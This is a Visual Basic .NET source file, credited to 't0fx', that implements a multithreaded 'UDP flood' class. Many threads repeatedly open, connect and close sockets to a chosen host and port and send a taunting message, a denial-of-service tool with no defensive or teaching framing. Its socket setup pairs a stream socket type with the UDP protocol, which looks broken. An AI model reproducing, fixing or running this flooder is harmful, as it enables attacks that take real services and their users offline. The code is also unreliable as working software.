'UDP flood class by t0fx
Imports System
Imports System.Net
Imports System.Net.Sockets
Imports System.Threading
Imports System.Text

Friend Class UDP
    Private Shared _floodingJob As ThreadStart()
    Private Shared _floodingThread As Thread()
    Private Shared _ipEo As IPEndPoint
    Private Shared _UdPcLass As SenduDp()
    Public Shared Host As String
    Public Shared IsEnabled As Boolean
    Public Shared Port As Integer
    Public Shared UDPzSockets As Integer
    Public Shared Threads As Integer

    Public Shared Sub StartUDPz()
        Try
            Dim addressList As IPAddress() = Dns.GetHostEntry(Host).AddressList
            _ipEo = New IPEndPoint(addressList(0), Port)
        Catch
            Dim address As IPAddress = IPAddress.Parse(Host)
            _ipEo = New IPEndPoint(address, Port)
        End Try
        _floodingThread = New Thread(Threads - 1) {}
        _floodingJob = New ThreadStart(Threads - 1) {}
        _UdPcLass = New SenduDp(Threads - 1) {}
        For i As Integer = 0 To Threads - 1
            _UdPcLass(i) = New SenduDp(_ipEo, UDPzSockets)
            _floodingJob(i) = New ThreadStart(AddressOf _UdPcLass(i).Send)
            _floodingThread(i) = New Thread(_floodingJob(i))
            _floodingThread(i).Start()
        Next
        IsEnabled = True
    End Sub

    Public Shared Sub StopUDPz()
        For i As Integer = 0 To Threads - 1
            Try
                _floodingThread(i).Abort()
                _floodingThread(i) = Nothing
                _floodingJob(i) = Nothing
                _UdPcLass(i) = Nothing
            Catch
            End Try
        Next
        IsEnabled = False
    End Sub


    Private Class SenduDp
        Private _sock As Socket()
        Private ipEo As IPEndPoint
        Private UDPzSockets As Integer

        Public Sub New(ByVal ipEo As IPEndPoint, ByVal UDPzSockets__1 As Integer)
            Me.ipEo = ipEo
            UDPzSockets = UDPzSockets__1
        End Sub

        Private Shared Sub OnConnect(ByVal ar As IAsyncResult)
        End Sub

        Public Sub Send()
            While True
                Dim num As Integer
                Try
                    _sock = New Socket(UDPzSockets - 1) {}
                    For num = 0 To UDPzSockets - 1
                        _sock(num) = New Socket(ipEo.AddressFamily, SocketType.Stream, ProtocolType.Udp)
                        _sock(num).Blocking = False
                        _sock(num).BeginConnect(ipEo, New System.AsyncCallback(AddressOf OnConnect), _sock(num))
                    Next
                    Thread.Sleep(100)
                    For num = 0 To UDPzSockets - 1
                        If _sock(num).Connected Then
                            _sock(num).Disconnect(False)
                        End If
                        _sock(num).Close()
                        _sock(num) = Nothing
                    Next
                    _sock = Nothing
                Catch
                    For num = 0 To UDPzSockets - 1
                        Try
                            If _sock IsNot Nothing Then
                                If _sock(num).Connected Then
                                    Dim msg As Byte() = Encoding.UTF8.GetBytes("Hello server! Wanna lag a little please?")
                                    Dim bytes As Byte() = New Byte(255) {}
                                    _sock(num).Send(msg, 0, msg.Length, SocketFlags.None)
                                    _sock(num).Disconnect(False)
                                End If
                                _sock(num).Close()
                                _sock(num) = Nothing
                            End If
                        Catch
                        End Try
                    Next
                End Try
            End While
        End Sub
    End Class

End Class

